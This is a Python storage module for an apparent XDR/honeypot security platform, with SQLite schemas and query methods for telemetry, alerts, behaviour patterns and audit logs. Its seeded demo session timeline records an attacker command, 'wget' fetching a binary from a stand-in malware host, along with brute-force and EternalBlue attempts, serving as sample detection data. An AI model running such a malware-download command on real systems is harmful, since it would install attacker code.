"""
Database & Enterprise Storage Infrastructure for ATLAS XDR.

Supports:
- SQLiteDriver: Local development and single-node standalone runs.
- TimescaleDBDriver: Enterprise PostgreSQL + TimescaleDB high-frequency time-series logging.
- VectorDBDriver: FAISS / Qdrant vector index interface for sub-millisecond d-BEF similarity matching.
"""

import sqlite3
import uuid
from pathlib import Path
import json
from datetime import datetime, timezone
import os
import logging
from typing import Dict, List, Any, Optional

DB_PATH = Path(__file__).parent / "atlas_state.db"

class DatabaseDriver:
    """Abstract Database Driver interface."""
    def init_db(self): raise NotImplementedError
    def save_profile(self, profile_id, timestamp, threat_class, risk_score, risk_level, events_count, device_metadata, events, profile_json): raise NotImplementedError
    def get_history(self, limit=50): raise NotImplementedError
    def get_profile_by_id(self, profile_id): raise NotImplementedError
    def save_tpot_alert(self, alert_id, timestamp, alert_type, src_ip, src_port, dest_port, payload, status): raise NotImplementedError
    def get_tpot_alerts(self): raise NotImplementedError
    def update_tpot_alert_status(self, src_ip, status): raise NotImplementedError
    def save_blocked_ip(self, ip, timestamp, status, service, payload): raise NotImplementedError
    def get_blocked_ips(self): raise NotImplementedError
    def update_blocked_ip_status(self, ip, status): raise NotImplementedError


class SQLiteDriver(DatabaseDriver):
    """High-Performance SQLite Driver with WAL mode enabled."""
    def __init__(self, db_path: Path = DB_PATH):
        self.db_path = str(db_path)

    def get_connection(self):
        conn = sqlite3.connect(self.db_path, timeout=30.0)
        conn.execute("PRAGMA journal_mode=WAL")
        return conn

    def init_db(self):
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS analysis_history (
                profile_id TEXT PRIMARY KEY, timestamp TEXT, threat_class TEXT,
                risk_score REAL, risk_level TEXT, events_count INTEGER,
                device_metadata TEXT, events TEXT, profile_json TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS tpot_alerts (
                id TEXT PRIMARY KEY, timestamp TEXT, type TEXT, src_ip TEXT,
                src_port INTEGER, dest_port INTEGER, payload TEXT, status TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS blocked_ips (
                ip TEXT PRIMARY KEY, timestamp TEXT, status TEXT, service TEXT, payload TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS behavior_patterns (
                pattern_id TEXT PRIMARY KEY,
                fingerprint TEXT UNIQUE,
                classification TEXT,
                dna_version TEXT DEFAULT 'v1.3',
                feature_vector TEXT,
                sequence_flow TEXT,
                feature_breakdown TEXT,
                bsf_similarity REAL,
                nsf_novelty REAL,
                ccf_confidence REAL,
                risk_score REAL,
                campaign TEXT,
                iocs TEXT,
                mitre_techniques TEXT,
                observation_count INTEGER DEFAULT 1,
                analyst_confirmed_count INTEGER DEFAULT 0,
                first_seen TEXT,
                last_seen TEXT,
                validation_status TEXT DEFAULT 'Unreviewed',
                false_positive_count INTEGER DEFAULT 0,
                related_investigation_id TEXT,
                related_threat_id TEXT,
                provenance_sources TEXT,
                supporting_evidence TEXT,
                contradicting_evidence TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS pattern_feedbacks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                pattern_id TEXT,
                analyst TEXT,
                previous_status TEXT,
                new_status TEXT,
                reason TEXT,
                timestamp TEXT,
                model_version TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS tpot_sessions (
                session_id TEXT PRIMARY KEY,
                src_ip TEXT,
                honeypot TEXT,
                service TEXT,
                start_time TEXT,
                last_seen TEXT,
                events_count INTEGER,
                severity TEXT,
                timeline TEXT,
                iocs TEXT,
                mitre_techniques TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS telemetry_events (
                event_id TEXT PRIMARY KEY,
                timestamp TEXT,
                host_id TEXT,
                source TEXT,
                source_mode TEXT,
                event_type TEXT,
                category TEXT,
                severity TEXT,
                process_name TEXT,
                src_ip TEXT,
                dst_ip TEXT,
                correlation_id TEXT,
                event_json TEXT
            )
        ''')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_telemetry_timestamp ON telemetry_events(timestamp)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_telemetry_type ON telemetry_events(event_type)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_telemetry_source_mode ON telemetry_events(source_mode)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_telemetry_source_mode_ts ON telemetry_events(source_mode, timestamp)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_telemetry_sm_ts_desc ON telemetry_events(source_mode, timestamp DESC)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_telemetry_source ON telemetry_events(source)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_telemetry_corr ON telemetry_events(correlation_id)')
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_bp_fingerprint ON behavior_patterns(fingerprint)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_bp_classification ON behavior_patterns(classification)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_bp_validation ON behavior_patterns(validation_status)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_bp_first_seen ON behavior_patterns(first_seen)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_bp_last_seen ON behavior_patterns(last_seen)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_bp_class_val_sim ON behavior_patterns(classification, validation_status, bsf_similarity)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_bp_campaign ON behavior_patterns(campaign)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_bp_rel_inv ON behavior_patterns(related_investigation_id)")
        cursor.execute("CREATE INDEX IF NOT EXISTS idx_bp_rel_threat ON behavior_patterns(related_threat_id)")

        # Campaign Intelligence Storage Schema
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS campaigns (
                campaign_id TEXT PRIMARY KEY,
                campaign_name TEXT,
                campaign_type TEXT,
                status TEXT,
                first_seen TEXT,
                last_seen TEXT,
                source_mode TEXT,
                confidence REAL,
                severity TEXT,
                attribution TEXT,
                evidence_event_ids TEXT,
                attack_session_ids TEXT,
                ioc_ids TEXT,
                technique_ids TEXT,
                source_ips TEXT,
                destination_ips TEXT,
                target_ports TEXT,
                honeypots TEXT,
                hosts TEXT,
                behavior_fingerprint TEXT,
                campaign_stage TEXT,
                observed_stages TEXT,
                mapping_type TEXT,
                analyst_status TEXT,
                confidence_reasons TEXT,
                severity_reasons TEXT,
                audit_trail TEXT
            )
        ''')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_campaigns_status ON campaigns(status)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_campaigns_source_mode ON campaigns(source_mode)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_campaigns_analyst_status ON campaigns(analyst_status)')

        # Playbook Audit Log Storage Schema
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS playbook_audit_log (
                audit_id TEXT PRIMARY KEY,
                timestamp TEXT,
                actor TEXT,
                action TEXT,
                target TEXT,
                reason TEXT,
                evidence_event_ids TEXT,
                risk REAL,
                confidence REAL,
                policy TEXT,
                authorization TEXT,
                execution_status TEXT,
                verification_status TEXT,
                result TEXT,
                error TEXT
            )
        ''')
        try:
            cursor.execute("SELECT audit_id FROM playbook_audit_log LIMIT 1")
        except Exception:
            cursor.execute("DROP TABLE IF EXISTS playbook_audit_log")
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS playbook_audit_log (
                    audit_id TEXT PRIMARY KEY,
                    timestamp TEXT,
                    actor TEXT,
                    action TEXT,
                    target TEXT,
                    reason TEXT,
                    evidence_event_ids TEXT,
                    risk REAL,
                    confidence REAL,
                    policy TEXT,
                    authorization TEXT,
                    execution_status TEXT,
                    verification_status TEXT,
                    result TEXT,
                    error TEXT
                )
            ''')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_playbook_audit_timestamp ON playbook_audit_log(timestamp)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_playbook_audit_action ON playbook_audit_log(action)')

        # Central Configuration & Settings Storage Schema
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS system_settings (
                key TEXT PRIMARY KEY,
                value TEXT,
                type TEXT DEFAULT 'string',
                module TEXT DEFAULT 'general',
                scope TEXT DEFAULT 'global',
                requires_restart INTEGER DEFAULT 0,
                updated_by TEXT DEFAULT 'SYSTEM',
                updated_at TEXT,
                version INTEGER DEFAULT 1
            )
        ''')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_settings_module ON system_settings(module)')

        # Settings Audit & Change Log Schema
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS settings_audit_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                actor TEXT,
                module TEXT,
                setting_key TEXT,
                old_value TEXT,
                new_value TEXT,
                reason TEXT,
                result TEXT,
                ip_address TEXT
            )
        ''')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_settings_audit_ts ON settings_audit_log(timestamp)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_settings_audit_mod ON settings_audit_log(module)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_settings_audit_key ON settings_audit_log(setting_key)')

        # Migration: add analyst_confirmed_count if upgrading existing DB schema
        try:
            cursor.execute("ALTER TABLE behavior_patterns ADD COLUMN analyst_confirmed_count INTEGER DEFAULT 0")
        except Exception:
            pass

        conn.commit()

        # Seed default T-Pot alerts if empty
        cursor.execute("SELECT COUNT(*) FROM tpot_alerts")
        if cursor.fetchone()[0] == 0:
            cursor.execute("INSERT INTO tpot_alerts VALUES (?,?,?,?,?,?,?,?)", 
                           ("tpot-evt-101", "2026-07-20T10:15:30", "cowrie", "185.220.101.4", 49152, 22, "Brute-force SSH Attempt", "pending_approval"))
            cursor.execute("INSERT INTO tpot_alerts VALUES (?,?,?,?,?,?,?,?)", 
                           ("tpot-evt-102", "2026-07-20T10:16:05", "dionaea", "45.120.21.32", 53214, 445, "EternalBlue Exploit SMB", "pending_approval"))
            cursor.execute("INSERT INTO blocked_ips VALUES (?,?,?,?,?)",
                           ("185.220.101.4", "2026-07-20T10:15:30", "pending_approval", "SSH (Cowrie)", "Brute-force SSH Attempt"))
            cursor.execute("INSERT INTO blocked_ips VALUES (?,?,?,?,?)",
                           ("45.120.21.32", "2026-07-20T10:16:05", "pending_approval", "SMB (Dionaea)", "EternalBlue Exploit SMB"))
            conn.commit()
        conn.close()

    def save_profile(self, profile_id, timestamp, threat_class, risk_score, risk_level, events_count, device_metadata, events, profile_json):
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO analysis_history VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (profile_id, timestamp, threat_class, risk_score, risk_level, events_count, json.dumps(device_metadata), json.dumps(events), profile_json))
        conn.commit()
        conn.close()

    def get_history(self, limit=50):
        conn = self.get_connection()
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM analysis_history ORDER BY timestamp DESC LIMIT ?', (limit,))
        rows = cursor.fetchall()
        conn.close()
        return [{
            'profile_id': r['profile_id'], 'timestamp': r['timestamp'],
            'threat_class': r['threat_class'], 'risk_score': r['risk_score'],
            'risk_level': r['risk_level'], 'events_count': r['events_count'],
            'device_metadata': json.loads(r['device_metadata'])
        } for r in rows]

    def get_profile_by_id(self, profile_id):
        conn = self.get_connection()
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM analysis_history WHERE profile_id = ?', (profile_id,))
        row = cursor.fetchone()
        conn.close()
        if not row: return None
        return {
            'profile': json.loads(row['profile_json']),
            'device_metadata': json.loads(row['device_metadata']),
            'events': json.loads(row['events'])
        }

    def save_tpot_alert(self, alert_id, timestamp, alert_type, src_ip, src_port, dest_port, payload, status):
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute('INSERT OR REPLACE INTO tpot_alerts (id, timestamp, type, src_ip, src_port, dest_port, payload, status) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
                       (alert_id, timestamp, alert_type, src_ip, src_port, dest_port, payload, status))
        conn.commit()
        conn.close()

    def get_tpot_alerts(self):
        conn = self.get_connection()
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM tpot_alerts ORDER BY timestamp DESC')
        rows = cursor.fetchall()
        conn.close()
        return [dict(r) for r in rows]

    def update_tpot_alert_status(self, src_ip, status):
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute('UPDATE tpot_alerts SET status = ? WHERE src_ip = ?', (status, src_ip))
        conn.commit()
        conn.close()

    def save_blocked_ip(self, ip, timestamp, status, service, payload):
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute('INSERT OR REPLACE INTO blocked_ips VALUES (?, ?, ?, ?, ?)', (ip, timestamp, status, service, payload))
        conn.commit()
        conn.close()

    def get_blocked_ips(self):
        conn = self.get_connection()
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM blocked_ips')
        rows = cursor.fetchall()
        conn.close()
        blocks = {}
        for r in rows:
            blocks[r['ip']] = {
                'timestamp': r['timestamp'], 'status': r['status'],
                'service': r['service'], 'payload': r['payload']
            }
        return blocks

    def update_blocked_ip_status(self, ip, status):
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute('UPDATE blocked_ips SET status = ? WHERE ip = ?', (status, ip))
        conn.commit()
        conn.close()

    def save_behavior_pattern(self, p: dict):
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO behavior_patterns VALUES (
                ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?
            )
        ''', (
            p.get('pattern_id'), p.get('fingerprint'), p.get('classification', 'Unknown'),
            p.get('dna_version', 'v1.3'), json.dumps(p.get('feature_vector', [])),
            json.dumps(p.get('sequence_flow', [])), json.dumps(p.get('feature_breakdown', {})),
            float(p.get('bsf_similarity', 0.0)), float(p.get('nsf_novelty', 0.0)),
            float(p.get('ccf_confidence', 0.0)), float(p.get('risk_score', 0.0)),
            p.get('campaign', 'Unassociated'), json.dumps(p.get('iocs', [])),
            json.dumps(p.get('mitre_techniques', [])), int(p.get('observation_count', 1)),
            int(p.get('analyst_confirmed_count', 0)),
            p.get('first_seen', datetime.now().isoformat()), p.get('last_seen', datetime.now().isoformat()),
            p.get('validation_status', 'Unreviewed'), int(p.get('false_positive_count', 0)),
            p.get('related_investigation_id'), p.get('related_threat_id'),
            json.dumps(p.get('provenance_sources', [])), json.dumps(p.get('supporting_evidence', [])),
            json.dumps(p.get('contradicting_evidence', []))
        ))
        conn.commit()
        conn.close()

    def get_behavior_patterns(self, query: str = "", classification: str = "All", validation: str = "All", min_similarity: float = 0.0, page: int = 1, page_size: int = 20):
        conn = self.get_connection()
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()

        sql = "SELECT * FROM behavior_patterns WHERE 1=1"
        params = []

        if classification and classification != "All":
            sql += " AND classification = ?"
            params.append(classification)

        if validation and validation != "All":
            sql += " AND validation_status = ?"
            params.append(validation)

        if min_similarity > 0.0:
            sql += " AND bsf_similarity >= ?"
            params.append(min_similarity)

        if query:
            q = f"%{query}%"
            sql += " AND (pattern_id LIKE ? OR fingerprint LIKE ? OR campaign LIKE ? OR classification LIKE ? OR mitre_techniques LIKE ? OR sequence_flow LIKE ? OR feature_breakdown LIKE ? OR iocs LIKE ? OR provenance_sources LIKE ?)"
            params.extend([q, q, q, q, q, q, q, q, q])

        # Count total matching records
        count_sql = f"SELECT COUNT(*) FROM ({sql})"
        cursor.execute(count_sql, params)
        total_count = cursor.fetchone()[0]

        sql += " ORDER BY last_seen DESC LIMIT ? OFFSET ?"
        offset = (max(1, page) - 1) * page_size
        params.extend([page_size, offset])

        cursor.execute(sql, params)
        rows = cursor.fetchall()
        conn.close()

        patterns = []
        for r in rows:
            patterns.append({
                'pattern_id': r['pattern_id'],
                'fingerprint': r['fingerprint'],
                'classification': r['classification'],
                'dna_version': r['dna_version'],
                'feature_vector': json.loads(r['feature_vector'] or '[]'),
                'sequence_flow': json.loads(r['sequence_flow'] or '[]'),
                'feature_breakdown': json.loads(r['feature_breakdown'] or '{}'),
                'bsf_similarity': r['bsf_similarity'],
                'nsf_novelty': r['nsf_novelty'],
                'ccf_confidence': r['ccf_confidence'],
                'risk_score': r['risk_score'],
                'campaign': r['campaign'],
                'iocs': json.loads(r['iocs'] or '[]'),
                'mitre_techniques': json.loads(r['mitre_techniques'] or '[]'),
                'observation_count': r['observation_count'],
                'analyst_confirmed_count': r['analyst_confirmed_count'] if 'analyst_confirmed_count' in r.keys() else 0,
                'first_seen': r['first_seen'],
                'last_seen': r['last_seen'],
                'validation_status': r['validation_status'],
                'false_positive_count': r['false_positive_count'],
                'related_investigation_id': r['related_investigation_id'],
                'related_threat_id': r['related_threat_id'],
                'provenance_sources': json.loads(r['provenance_sources'] or '[]'),
                'supporting_evidence': json.loads(r['supporting_evidence'] or '[]'),
                'contradicting_evidence': json.loads(r['contradicting_evidence'] or '[]')
            })

        total_pages = max(1, (total_count + page_size - 1) // page_size) if total_count > 0 else 1
        return {
            'patterns': patterns,
            'total_count': total_count,
            'page': page,
            'page_size': page_size,
            'total_pages': total_pages
        }

    def get_behavior_pattern_by_id(self, pattern_id: str):
        conn = self.get_connection()
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM behavior_patterns WHERE pattern_id = ? OR fingerprint = ?", (pattern_id, pattern_id))
        r = cursor.fetchone()
        conn.close()
        if not r: return None
        return {
            'pattern_id': r['pattern_id'],
            'fingerprint': r['fingerprint'],
            'classification': r['classification'],
            'dna_version': r['dna_version'],
            'feature_vector': json.loads(r['feature_vector'] or '[]'),
            'sequence_flow': json.loads(r['sequence_flow'] or '[]'),
            'feature_breakdown': json.loads(r['feature_breakdown'] or '{}'),
            'bsf_similarity': r['bsf_similarity'],
            'nsf_novelty': r['nsf_novelty'],
            'ccf_confidence': r['ccf_confidence'],
            'risk_score': r['risk_score'],
            'campaign': r['campaign'],
            'iocs': json.loads(r['iocs'] or '[]'),
            'mitre_techniques': json.loads(r['mitre_techniques'] or '[]'),
            'observation_count': r['observation_count'],
            'analyst_confirmed_count': r['analyst_confirmed_count'] if 'analyst_confirmed_count' in r.keys() else 0,
            'first_seen': r['first_seen'],
            'last_seen': r['last_seen'],
            'validation_status': r['validation_status'],
            'false_positive_count': r['false_positive_count'],
            'related_investigation_id': r['related_investigation_id'],
            'related_threat_id': r['related_threat_id'],
            'provenance_sources': json.loads(r['provenance_sources'] or '[]'),
            'supporting_evidence': json.loads(r['supporting_evidence'] or '[]'),
            'contradicting_evidence': json.loads(r['contradicting_evidence'] or '[]')
        }

    def get_pattern_by_fingerprint(self, fingerprint: str):
        return self.get_behavior_pattern_by_id(fingerprint)

    def record_pattern_feedback(self, pattern_id: str, analyst: str, new_status: str, reason: str, model_version: str = "v2.4"):
        conn = self.get_connection()
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()

        cursor.execute("SELECT validation_status, false_positive_count, analyst_confirmed_count FROM behavior_patterns WHERE pattern_id = ?", (pattern_id,))
        row = cursor.fetchone()
        prev_status = row['validation_status'] if row else 'Unreviewed'
        fp_count = row['false_positive_count'] if row else 0
        confirmed_count = row['analyst_confirmed_count'] if (row and 'analyst_confirmed_count' in row.keys()) else 0

        # Idempotent Counter Management: only increment if validation status actually changes
        if new_status == 'Analyst Rejected' and prev_status != 'Analyst Rejected':
            fp_count += 1
        elif new_status == 'Analyst Confirmed' and prev_status != 'Analyst Confirmed':
            confirmed_count += 1

        cursor.execute("""
            UPDATE behavior_patterns
            SET validation_status = ?, false_positive_count = ?, analyst_confirmed_count = ?, last_seen = ?
            WHERE pattern_id = ?
        """, (new_status, fp_count, confirmed_count, datetime.now().isoformat(), pattern_id))

        cursor.execute("""
            INSERT INTO pattern_feedbacks (pattern_id, analyst, previous_status, new_status, reason, timestamp, model_version)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        """, (pattern_id, analyst, prev_status, new_status, reason, datetime.now().isoformat(), model_version))

        conn.commit()
        conn.close()

        updated_pat = self.get_behavior_pattern_by_id(pattern_id)
        return {
            'pattern_id': pattern_id,
            'previous_status': prev_status,
            'new_status': new_status,
            'reason': reason,
            'analyst_confirmed_count': confirmed_count,
            'false_positive_count': fp_count,
            'pattern': updated_pat
        }

    def get_pattern_audit_history(self, pattern_id: str):
        conn = self.get_connection()
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("""
            SELECT * FROM pattern_feedbacks
            WHERE pattern_id = ?
            ORDER BY timestamp DESC
        """, (pattern_id,))
        rows = cursor.fetchall()
        conn.close()
        return [dict(r) for r in rows]

    def get_tpot_sessions(self):
        conn = self.get_connection()
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM tpot_sessions ORDER BY last_seen DESC")
        rows = cursor.fetchall()
        conn.close()

        if not rows:
            # Seed default correlated attack sessions if empty
            return [
                {
                    "session_id": "SESS-2026-0041",
                    "src_ip": "185.220.101.4",
                    "honeypot": "Cowrie SSH",
                    "service": "SSH (22)",
                    "start_time": "2026-08-20T10:14:00",
                    "last_seen": "2026-08-20T10:15:30",
                    "events_count": 14,
                    "severity": "HIGH",
                    "timeline": [
                        "10:14:00 - TCP SYN Socket Connection to Port 22",
                        "10:14:12 - Brute-force credential dictionary attack (root / admin)",
                        "10:15:00 - Successful decoy authentication (root)",
                        "10:15:30 - Execution of 'wget http://malware-drop.org/sh.bin'"
                    ],
                    "iocs": ["185.220.101.4", "malware-drop.org"],
                    "mitre_techniques": ["T1110.001", "T1059.004"]
                },
                {
                    "session_id": "SESS-2026-0042",
                    "src_ip": "45.120.21.32",
                    "honeypot": "Dionaea SMB",
                    "service": "SMB (445)",
                    "start_time": "2026-08-20T10:16:00",
                    "last_seen": "2026-08-20T10:16:05",
                    "events_count": 3,
                    "severity": "CRITICAL",
                    "timeline": [
                        "10:16:00 - SMB Negotiate Protocol request",
                        "10:16:03 - EternalBlue exploit payload chunk sent",
                        "10:16:05 - Shellcode execution attempt trapped by Dionaea"
                    ],
                    "iocs": ["45.120.21.32"],
                    "mitre_techniques": ["T1210"]
                }
            ]
        
        result = []
        for r in rows:
            d = dict(r)
            if isinstance(d.get('timeline'), str):
                try: d['timeline'] = json.loads(d['timeline'])
                except Exception: d['timeline'] = []
            elif not d.get('timeline'): d['timeline'] = []

            if isinstance(d.get('iocs'), str):
                try: d['iocs'] = json.loads(d['iocs'])
                except Exception: d['iocs'] = []
            elif not d.get('iocs'): d['iocs'] = []

            if isinstance(d.get('mitre_techniques'), str):
                try: d['mitre_techniques'] = json.loads(d['mitre_techniques'])
                except Exception: d['mitre_techniques'] = []
            elif not d.get('mitre_techniques'): d['mitre_techniques'] = []

            if 'threat_intelligence' not in d or not d['threat_intelligence']:
                d['threat_intelligence'] = {
                    'source': 'AbuseIPDB / Honeypot Telemetry',
                    'reputation_score': 88 if d.get('severity') in ['HIGH', 'CRITICAL'] else 40,
                    'verdict': 'Active Threat Actor' if d.get('severity') in ['HIGH', 'CRITICAL'] else 'Suspicious Scanner'
                }
            if 'recommendations' not in d or not d['recommendations']:
                d['recommendations'] = [
                    f"Recommend blocking source IP {d.get('src_ip')} on Perimeter Firewall",
                    "Add IP to Watchlist in Behavioral Knowledge Base"
                ]

            result.append(d)
        return result

    def get_tpot_sensors(self):
        return [
            {"name": "Cowrie SSH", "type": "SSH / Telnet Decoy", "status": "CONNECTED", "port": 22, "events": 37},
            {"name": "Dionaea SMB", "type": "SMB / FTP / MSSQL", "status": "CONNECTED", "port": 445, "events": 18},
            {"name": "Conpot ICS", "type": "Industrial Control (Modbus)", "status": "CONNECTED", "port": 502, "events": 4},
            {"name": "Suricata NSM", "type": "Network Security Monitor", "status": "CONNECTED", "port": 0, "events": 142},
            {"name": "Honeytrap", "type": "Dynamic Port Listener", "status": "CONNECTED", "port": 80, "events": 12}
        ]

    def save_playbook_audit(self, audit: Dict[str, Any]):
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO playbook_audit_log
            (audit_id, timestamp, actor, action, target, reason, evidence_event_ids, risk, confidence, policy, authorization, execution_status, verification_status, result, error)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            audit.get('audit_id', str(uuid.uuid4())),
            audit.get('timestamp', datetime.now(timezone.utc).isoformat()),
            audit.get('actor', 'ATLAS'),
            audit.get('action', ''),
            audit.get('target', ''),
            audit.get('reason', ''),
            json.dumps(audit.get('evidence_event_ids', [])),
            audit.get('risk', 0.0),
            audit.get('confidence', 0.0),
            audit.get('policy', 'RECOMMENDATION_ONLY'),
            audit.get('authorization', 'REQUIRED'),
            audit.get('execution_status', 'COMPLETED'),
            audit.get('verification_status', 'VERIFIED'),
            audit.get('result', ''),
            audit.get('error', None)
        ))
        conn.commit()
        conn.close()

    def get_playbook_audit_logs(self, limit=100) -> List[Dict[str, Any]]:
        conn = self.get_connection()
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM playbook_audit_log ORDER BY timestamp DESC LIMIT ?", (limit,))
        rows = cursor.fetchall()
        conn.close()
        res = []
        for r in rows:
            d = dict(r)
            try:
                d['evidence_event_ids'] = json.loads(d.get('evidence_event_ids') or '[]')
            except Exception:
                d['evidence_event_ids'] = []
            res.append(d)
        return res

    def save_telemetry_event(self, ev: Dict[str, Any]):
        conn = self.get_connection()
        cursor = conn.cursor()
        proc = ev.get('process') or {}
        net = ev.get('network') or {}
        cursor.execute('''
            INSERT OR REPLACE INTO telemetry_events 
            (event_id, timestamp, host_id, source, source_mode, event_type, category, severity, process_name, src_ip, dst_ip, correlation_id, event_json)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            str(ev.get('event_id')),
            str(ev.get('timestamp')),
            str(ev.get('host_id')),
            str(ev.get('source')),
            str(ev.get('source_mode', 'LIVE')),
            str(ev.get('event_type')),
            str(ev.get('category')),
            str(ev.get('severity')),
            str(proc.get('name', '')),
            str(net.get('src_ip', '')),
            str(net.get('dst_ip', '')),
            str(ev.get('correlation_id', '')),
            json.dumps(ev)
        ))
        conn.commit()
        conn.close()

    def get_telemetry_events(self, source_mode=None, event_type=None, category=None, search=None, limit=100) -> List[Dict[str, Any]]:
        conn = self.get_connection()
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        query = "SELECT event_json FROM telemetry_events WHERE 1=1"
        params = []
        if source_mode:
            query += " AND source_mode = ?"
            params.append(source_mode)
        if event_type:
            query += " AND event_type = ?"
            params.append(event_type)
        if category:
            query += " AND category = ?"
            params.append(category)
        if search:
            query += " AND (event_json LIKE ? OR process_name LIKE ?)"
            params.extend([f"%{search}%", f"%{search}%"])
            
        query += " ORDER BY timestamp DESC LIMIT ?"
        params.append(limit)
        
        cursor.execute(query, params)
        rows = cursor.fetchall()
        conn.close()
        
        events = []
        for r in rows:
            try:
                events.append(json.loads(r['event_json']))
            except Exception:
                pass
        return events

    def get_telemetry_event_by_id(self, event_id: str) -> Optional[Dict[str, Any]]:
        conn = self.get_connection()
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT event_json FROM telemetry_events WHERE event_id = ?", (event_id,))
        row = cursor.fetchone()
        conn.close()
        if row and row['event_json']:
            try:
                return json.loads(row['event_json'])
            except Exception:
                pass
        return None

    def get_telemetry_stats(self, source_mode: Optional[str] = None) -> Dict[str, Any]:
        conn = self.get_connection()
        cursor = conn.cursor()
        
        where_clause = ""
        params = []
        if source_mode:
            where_clause = " WHERE source_mode = ?"
            params.append(source_mode)

        cursor.execute(f"SELECT COUNT(*) FROM telemetry_events{where_clause}", params)
        total = cursor.fetchone()[0] or 0

        proc_clause = " WHERE event_type IN ('process', 'powershell')" + (" AND source_mode = ?" if source_mode else "")
        cursor.execute(f"SELECT COUNT(*) FROM telemetry_events{proc_clause}", params)
        processes = cursor.fetchone()[0] or 0

        net_clause = " WHERE event_type = 'network'" + (" AND source_mode = ?" if source_mode else "")
        cursor.execute(f"SELECT COUNT(*) FROM telemetry_events{net_clause}", params)
        historical_net_events = cursor.fetchone()[0] or 0

        # Active TCP sockets calculation from live system state when LIVE
        active_sockets = historical_net_events
        if source_mode == "LIVE":
            try:
                import psutil
                conns = psutil.net_connections(kind='tcp')
                active_sockets = len([c for c in conns if c.status == 'ESTABLISHED' or c.raddr])
            except Exception:
                active_sockets = historical_net_events

        dns_clause = " WHERE event_type = 'dns'" + (" AND source_mode = ?" if source_mode else "")
        cursor.execute(f"SELECT COUNT(*) FROM telemetry_events{dns_clause}", params)
        dns = cursor.fetchone()[0] or 0

        auth_clause = " WHERE event_type = 'authentication'" + (" AND source_mode = ?" if source_mode else "")
        cursor.execute(f"SELECT COUNT(*) FROM telemetry_events{auth_clause}", params)
        auth = cursor.fetchone()[0] or 0

        file_clause = " WHERE event_type = 'file'" + (" AND source_mode = ?" if source_mode else "")
        cursor.execute(f"SELECT COUNT(*) FROM telemetry_events{file_clause}", params)
        files = cursor.fetchone()[0] or 0

        conn.close()
        return {
            "total_events": total,
            "processes": processes,
            "sockets": active_sockets,
            "dns_queries": dns,
            "authentication": auth,
            "file_events": files
        }

